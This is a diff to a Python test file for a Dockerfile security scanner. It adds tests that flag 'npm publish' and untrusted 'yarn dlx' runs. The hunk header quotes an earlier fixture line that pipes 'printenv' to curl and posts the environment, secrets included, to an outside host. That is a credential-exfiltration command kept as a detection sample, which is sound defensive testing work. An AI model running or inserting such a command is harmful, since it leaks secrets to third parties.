@@ -262,3 +262,28 @@ RUN printenv | curl -s -X POST https://env.debug.tools/capture -d @-
     )
 
     assert findings == []
+
+
+def _dockerfile_lines(tmp_path: Path, text: str, rule_id: str) -> list[int]:
+    (tmp_path / "Dockerfile").write_text(text, encoding="utf-8")
+    return sorted(
+        finding["line"]
+        for finding in scan_dockerfiles(tmp_path)
+        if finding["rule_id"] == rule_id
+    )
+
+
+def test_dockerfile_run_reads_prefixed_and_later_line_commands(tmp_path: Path):
+    assert _dockerfile_lines(
+        tmp_path, "FROM node:22\nRUN sudo npm publish\n", "SKY-D340"
+    ) == [2]
+    assert _dockerfile_lines(
+        tmp_path,
+        'FROM node:22\nRUN ["/bin/sh", "-c", "npm ci\\nnpm publish"]\n',
+        "SKY-D340",
+    ) == [2]
+
+
+def test_dockerfile_yarn_install_is_not_an_untrusted_tool(tmp_path: Path):
+    text = "FROM node:22\nRUN yarn install --frozen-lockfile\nRUN yarn dlx tool\n"
+    assert _dockerfile_lines(tmp_path, text, "SKY-D341") == [3]
